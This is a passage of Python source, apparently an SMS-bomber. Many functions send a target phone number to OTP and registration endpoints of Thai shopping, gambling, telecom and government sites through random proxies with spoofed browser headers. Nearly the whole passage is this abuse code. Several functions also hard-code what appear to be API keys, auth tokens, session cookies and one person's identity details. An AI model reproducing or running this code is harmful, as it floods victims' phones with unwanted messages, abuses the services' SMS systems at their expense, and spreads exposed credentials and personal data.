    "https://api.salehere.co.th/graphql",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "content-type": "application/json",
      "accept": "*/*",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://salehere.co.th",
      "referer": "https://salehere.co.th/",
      "cookie": "_fbp=fb.2.1663532271733.671668678",
      "cookie": "_ga=GA1.3.1446059210.1663532277",
      "cookie": "_gid=GA1.3.891158475.1663532277",
      "cookie": "_gat_UA-118968627-9=1",
      "cookie": "_ga_TQ163J47DR=GS1.1.1663532276.1.0.1663532277.0.0.0",
      "cookie":
      "__utma=195884718.1446059210.1663532277.1663532278.1663532278.1",
      "cookie": "__utmc=195884718",
      "cookie": "__utmt_%5Bobject%20Object%5D=1",
      "cookie": "G_ENABLED_IDPS=google",
      "cookie": "__utmb=195884718.2.10.1663532278"
    },
    json={
      "operationName": "sendUserOTPV2",
      "variables": {
        "tel": f"{phone}",
        "token": ""
      },
      "extensions": {
        "persistedQuery": {
          "version":
          1,
          "sha256Hash":
          "acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"
        }
      }
    })


def api58(phone):
  post(
    "https://api.best-inc.co.th/account/sendlogincode",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "content-type": "application/x-www-form-urlencoded",
      "accept": "application/json",
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "x-lan": "EN",
      "sec-ch-ua-platform": "Android",
      "Origin": "https://www.best-inc.co.th",
      "Referer": "https://www.best-inc.co.th/"
    },
    data=f"phoneNumber=%22{phone}%22")


def api59(phone):
  post(
    "https://api.mcshop.com/cognito/otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host": "api.mcshop.com",
      "content-length": "41",
      "x-store-token": "mcshop",
      "accept-language": "th",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "content-type": "application/json;charset=UTF-8",
      "accept": "application/json, text/plain, */*",
      "x-auth-token":
      "O2d1ZXN0OzExNDcwNTg3OzIxODY1ODkyZTMzZGMwMGMzZjNlZmZlNDBlMmY3OTgzOzs7Ow==",
      "x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3",
      "sec-ch-ua-platform": "Android",
      "origin": "https://www.mcshop.com",
      "sec-fetch-site": "same-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://www.mcshop.com/"
    },
    json={
      "username": f"{phone}",
      "language": "th"
    })


def api60(phone):
  post(
    "https://u.icq.net/api/v4/rapi",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "content-type":
      "application/json",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"
    },
    json={
      "method": "auth/sendCode",
      "reqId": "24973-1587490090",
      "params": {
        "phone": f"66{phone[1:]}",
        "language": "en-US",
        "route": "sms",
        "devId": "ic1rtwz1s1Hj1O0r",
        "application": "icq"
      }
    })


def api61(phone):
  post(f"https://hdmall.co.th/phone_verifications?mobile={phone}&resend=true",
       headers=header)


def api62(phone):
  send = Session()
  send.headers.update({
    "user-agent":
    "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
    'content-type':
    'application/x-www-form-urlencoded; charset=UTF-8'
  })
  send = send.post("https://api.jobbkk.com/v1/easy/otp_code",
                   proxies={"http": "http://" + random.choice(proxy)},
                   data="mobile=" + phone)


def api63(phone):
  post(
    "https://app.droprich.co/agent/registergetsmsotp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Content-Type":
      "application/x-www-form-urlencoded; charset=UTF-8",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"
    },
    data=f"phonenumber={phone}")


def api64(phone):
  post(
    "https://graph.firster.com/graphql",
    headers={
      "User-Agent": useragent,
      "organizationcode": "lifestyle",
      "content-type": "application/json"
    },
    json={
      "operationName":
      "sendOtp",
      "variables": {
        "input": {
          "mobileNumber": phone[1:],
          "phoneCode": "THA-66"
        }
      },
      "query":
      "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"
    })


def api65(phone):
  post(
    "https://aws-autobet168.api-ufa.com/transfer/f/user/request-otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host": "aws-autobet168.api-ufa.com",
      "content-length": "45",
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://mob-wallet.autoeasy.io",
      "sec-fetch-site": "cross-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://mob-wallet.autoeasy.io/"
    },
    json={
      "phoneNumber": f"{phone}",
      "prefix": "F2R41"
    })


def api66(phone):
  post(
    "https://api.giztix.com/graphql",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "content-type": "application/json",
      "authorization": "null",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://app.giztix.com",
      "referer": "https://app.giztix.com/"
    },
    json={
      "operationName":
      "OtpGeneratePhone",
      "variables": {
        "phone": f"66{phone}"
      },
      "query":
      "mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"
    })


def api67(phone):
  post(
    "https://api.sbobet.one/api/RegisterService/RequestOTP",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host": "api.sbobet.one",
      "content-length": "22",
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://app.sbobet.one",
      "sec-fetch-site": "same-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://app.sbobet.one/"
    },
    json={"Phone": f"{phone}"})


def api68(phone):
  get(
    f"https://covid19vaccine.ntplc.co.th/ntboosterapi/user/getOTP?telNumber={phone}",
    proxies={"http": "http://" + random.choice(proxy)})


def api69(phone):
  get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",
      proxies={"http": "http://" + random.choice(proxy)})


def api70(phone):
  post(
    "https://pgzeed.org/api/otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "content-type": "application/json",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://pgzeed.org",
      "referer": "https://pgzeed.org/?campGame=SLOT&s_=59",
      "cookie": "auth.strategy=local"
    },
    json={
      "phone_number": f"{phone}",
      "register_type": ""
    })


def api71(phone):
  post(
    "https://referral.huaynaka.com/v1/sendotp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "content-type": "application/json;charset=UTF-8",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "x-api-key": "Prmx2j2mZaaKwCR4jDyki9VANcKqF3565owwHgDE",
      "sec-ch-ua-platform": "Android",
      "origin": "https://tang.huaynaka.com",
      "referer": "https://tang.huaynaka.com/"
    },
    json={"phone": f"+66{phone}"})


def api72(phone):
  post(
    "https://zuma789-backend.uwallet.link/api/otp/send",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host": "zuma789-backend.uwallet.link",
      "content-length": "28",
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json;charset=UTF-8",
      "x-requested-with": "wallet-user",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://zuma789.uwallet.link",
      "referer": "https://zuma789.uwallet.link/"
    },
    json={"phoneNumber": f"{phone}"})


def api73(phone):
  post(
    "https://www.sabuyebuy.com/wp-json/api/v2/send-x",
    headers={
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
      "content-type": "application/json"
    },
    json={
      "first_name": "askdhajshd",
      "last_name": "jhasjdhasjd",
      "address": "",
      "birthday": "",
      "phone": f"{phone}",
      "commissions_id": "",
      "email_address": "aasdhas@Jhasd.asd",
      "password": "as257400",
      "agreements": "true",
      "uuid": "3f202dcd-8093-4ff9-a263-07ff7e9bd282",
      "affiliate_id": "1"
    })


def api74(phone):
  post(
    "https://api.cdfoi9.com/api/v1/index.php",
    proxies={"http": "http://" + random.choice(proxy)},
    data=
    f"module=%2Fusers%2FgetVerificationCode&mobile={phone}&merchantId=111&domainId=0&accessId=&accessToken=&walletIsAdmin=",
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "content-type": "application/x-www-form-urlencoded"
    })


def api75(phone):
  post(
    f"https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone={phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=",
    proxies={"http": "http://" + random.choice(proxy)})


def api76(phone):
  post(
    "https://api.mango-slots.com/sexyline-ecp/api/v1/sms/sendVerificationCode/register",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 11; vivo 1819) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",
      "content-type": "application/json;charset=UTF-8"
    },
    json={"mobile": f"66 {phone}"})


def api77(phone):
  post(
    "https://th.openrice.com/api/v1/auth/signup/phone?uiLang=th&uiCity=bangkokr",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "content-type": "application/x-www-form-urlencoded",
      "accept": "*/*",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android"
    },
    data=f"areaCode=6&phone={phone}&regionId=400")


def api78(phone):
  post(
    "https://api.jokerslotzz.com/public/request-otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Host": "api.jokerslotzz.com",
      "content-length": "25",
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json;charset=UTF-8",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": "Android",
      "origin": "https://member.jokerslotzz.com",
      "referer": "https://member.jokerslotzz.com/"
    },
    json={"username": f"{phone}"})


def api79(phone):
  get(
    f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone}?gaClientId=1814942739.1666373332&user-type=buyer&lang=th",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "x_vehicle_type": "CAR",
      "x_platform": "mSite",
      "sec-ch-ua-mobile": "?1",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
      "accept": "application/json, text/plain, */*",
      "x_country": "TH",
      "sec-ch-ua-platform": "Android",
      "origin": "https://www.cars24.co.th"
    })


def api80(phone):
  post("https://api.1112delivery.com/api/v1/otp/create",
       proxies={"http": "http://" + random.choice(proxy)},
       data={
         'phonenumber': phone,
         'language': "th"
       })


def api81(phone):
  post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
       proxies={"http": "http://" + random.choice(proxy)},
       json={
         "on": {
           "value": phone,
           "country": "66"
         },
         "type": "mobile"
       })


def api82(phone):
  post(
    'https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "User-Agent":
      "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
      "Content-Type":
      "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Requested-With":
      "XMLHttpRequest",
      "Cookie":
      "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"
    },
    data=
    f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER"
  )


def noc(phone):
  post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661",
       proxies={"http": "http://" + random.choice(proxy)},
       headers={"User-Agent": useragent},
       json={
         "lang": "th",
         "userType": "BUYER",
         "locale": "th",
         "orgIdfier": "scg",
         "phone": f"+66{phone[1:]}",
         "type": "signup",
         "otpTemplate": "buyer_signup_otp_message",
         "userParams": {
           "buyerName": randomString(10)
         }
       })


def aisplay(phone):
  session = Session()
  ReqTOKEN = session.get(
    "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
    headers={
      "User-Agent": useragent
    }).text
  session.post(
    "https://srfng.ais.co.th/login/sendOneTimePW",
    data=
    f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
    headers={
      "User-Agent":
      useragent,
      "Content-Type":
      "application/x-www-form-urlencoded; charset=UTF-8",
      "authorization":
      f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''
    })


def api83(phone):
  post(
    "https://api2.1112.com/api/v1/otp/create",
    json={
      "phonenumber": f"{phone}",
      "language": "th"
    },
    headers={
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
    })


def api84(phone):
  header = {
    "Host":
    "icq.com",
    "Connection":
    "keep-alive",
    "Accept":
    "application/json, text/javascript, */*; q=0.01",
    "Content-Type":
    "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With":
    "XMLHttpRequest",
    "sec-ch-ua-mobile":
    "?1",
    "User-Agent":
    "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "sec-ch-ua-platform":
    "Android",
    "Sec-Fetch-Site":
    "same-origin",
    "Sec-Fetch-Mode":
    "cors",
    "Sec-Fetch-Dest":
    "empty",
    "Referer":
    "https://icq.com/login/",
    "Cookie":
    "_ga=GA1.2.1621707397.1646539138; _gid=GA1.2.297898894.1646539138; tmr_lvid=9e111ca0bdfa20ce32ecfc30164fe745; tmr_lvidTS=1646539138109; tmr_detect=0%7C1646539140922; tmr_reqNum=3; user_tracking=34f0c4af712c38eccf984ee9db9fe62b; _gat=1; mr1lad=622451c76dc2ce79-300-300-"
  }
  post("https://icq.com/smscode/login/ru",
       proxies={"http": "http://" + random.choice(proxy)},
       headers=header,
       data=f"msisdn=66{phone[1:]}")


def api85(phone):
  post("https://api.thaisme.one/smegp/register/request-otp",
       proxies={"http": "http://" + random.choice(proxy)},
       json={"MOBILE": phone})


def api86(phone):
  post("https://api.fairdee.co.th/profile/request-otp",
       proxies={"http": "http://" + random.choice(proxy)},
       header=header,
       json={
         "username": f"{phone}",
         "username_type": "phone",
         "intent": "signup"
       })


def api87(phone):
  post(
    "https://api-member.oneplaybet.com/user/register/otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"
    },
    json={
      "mobileNumber": f"{phone}",
      "partnerKey": "XPB289TOP113"
    })


def api88(phone):
  post(
    "https://api.monkeyeveryday.com/graphql",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
      "content-type": "application/json"
    },
    json={
      "operationName":
      "requestRegistrationOtp",
      "variables": {phone},
      "query":
      "mutation requestRegistrationOtp($phone: String!) {\n  requestRegistrationOtp(phone: $phone) {\n    token\n    typename\n  }\n}\n"
    })


def api89(phone):
  post(
    "https://api.yellowtire.com/api/user/request-otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "Content-Type":
      "application/json",
      "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
    },
    json={"tel": f"{phone}"})


def api90(phone):
  post(
    "https://api.swopmart.co.th/graphql",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
      "authorization": "Bearer undefined"
    },
    json={
      "operationName":
      "requestOtpPhoneNumber",
      "variables": {
        "phoneNumber": f"{phone}"
      },
      "query":
      "mutation requestOtpPhoneNumber($phoneNumber: String!) {\n  requestOtpPhoneNumber(phoneNumber: $phoneNumber)\n}"
    })


def api91(phone):
  post(
    "https://openapi.bigc.co.th/customer/v1/otp",
    proxies={"http": "http://" + random.choice(proxy)},
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
      "content-type": "application/json"
    },
    json={"phone_no": phone})


def call1(phone):
  post(
    "https://1ufa.bet/_ajax_/request-otp",
    data={
      "request_otp[phoneNumber]": f"{phone}",
      "request_otp[termAndCondition]": "1",
      "request_otp[_token]": "U5doBrJJ5u91294kDU40Z_KrdPLTcfNQ5J3MhDsyg8M"
    },
    headers={
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
      "Content-Type":
      "application/x-www-form-urlencoded",
      "cookie":
      "_gid=GA1.2.1736081460.1679951032; PHPSESSID=0j2uoh0oesv4ngaopas52ug8gk; _raw_ref=https%3A%2F%2F1ufa.bet%2F; _ga=GA1.2.1166363420.1679951032; _ga_5148MHRV47=GS1.1.1679951031.1.1.1679952029.0.0.0"
    })
def smsapi1(phone):
    requests.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel":f"{phone}","type":"login"},proxies={'http': 'http://' + random.choice(s)})

def smsapi2(phone):
    requests.post("https://lb-api.fox83-sy.xyz/api/otp/register",data={"applicant":phone,"serviceName":"fox888.com"},proxies={'http': 'http://' + random.choice(s)})

def smsapi3(phone):
    requests.post("https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no":f"{phone}"},proxies={'http': 'http://' + random.choice(s)})

def smsapi4(phone):
    requests.post("https://service-api.auto1.co.th/w/user/request-otp-on-register",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"},json={"ConsentFlag":"true","AcceptPolicy":"true","Tel":phone,"OTPId":"","OTP1":"","OTP2":"","OTP3":"","OTP4":"","OTP5":"","OTP6":"","Email":"","Pin1":"","Pin2":"","Pin3":"","Pin4":"","Pin5":"","Pin6":"","PinConfirm1":"","PinConfirm2":"","PinConfirm3":"","PinConfirm4":"","PinConfirm5":"","PinConfirm6":"","FirstName":"","LastName":""},proxies={'http': 'http://' + random.choice(s)})

def smsapi5(phone):
    requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}",proxies={'http': 'http://' + random.choice(s)})

def smsapi6(phone):
    requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}",headers={
    "Accept": "application/json, text/plain, /",
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"},proxies={'http': 'http://' + random.choice(s)})

def smsapi7(phone):
    requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
      "language": "th"},headers={"accept": "application/json, text/plain, /",
      "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})

def smsapi8(phone):
    requests.post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"},proxies={'http': 'http://' + random.choice(s)})

def smsapi9(phone):
    requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})

def smsapi10(phone):
    requests.get(f"https://kamuishop.online/kamuiapi/phone/{phone}",proxies={'http': 'http://' + random.choice(s)})

def smsapi11(phone):
    requests.get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "_fbp=fb.1.1664699330289.47112595; XSRF-TOKEN=eyJpdiI6Ijk3cVRMUndzZ2FUME8wV2VzRXFaWWc9PSIsInZhbHVlIjoiQjRkNzlNYXR2TWtSWmNySlFYVjBoQk80RGJMR215RXVFUjRuMTFNYm5ocGRDRmNGcHNjWmpOeUdnOWlPbmFhVXA5eG1LUlB2SVZEMjRFWEVITTRZV1hzZUtZenArenZjK0R3UE5OTUdTQkVWUG1tYmkrTG1NWWFiTUZOZ1NRMlIiLCJtYWMiOiI3Y2M1OGJkMzg2MzZkZDYwNjlmNjNkMmFkYWZlZDVkNjliZGJjMjUwN2MyMjJmYzgxODE3ZGYxOWY1NWU4MzhlIiwidGFnIjoiIn0%3D; iship_session=eyJpdiI6IjdueEZQTU5Kc0FXZ0hjeVF0L2s2WVE9PSIsInZhbHVlIjoidHNzZ1RINDhta1BnUkFic29hdFlMNU8zVWt0MGZYbUVMb1Q0ZjM0OVR5cFlSbE01NlNuMWRoeGF4SldiVHN3U3JFZWg5dnJvMEZHbnF6cnlNdG45SmZjSGxqRkNRN0w0T3oyclBHc09ZM2svd3VZZkl4TG9NRHFLMTIxeGhvd2oiLCJtYWMiOiJhMTBjZThjNGU5M2Y0NjM1MTQ4ZTI4MGFmMzkxMmQ4ZmY0NjljNGM5YjBkZWZkMGIxYTM5Y2Y5MDgyNWZkOTk1IiwidGFnIjoiIn0%3D; 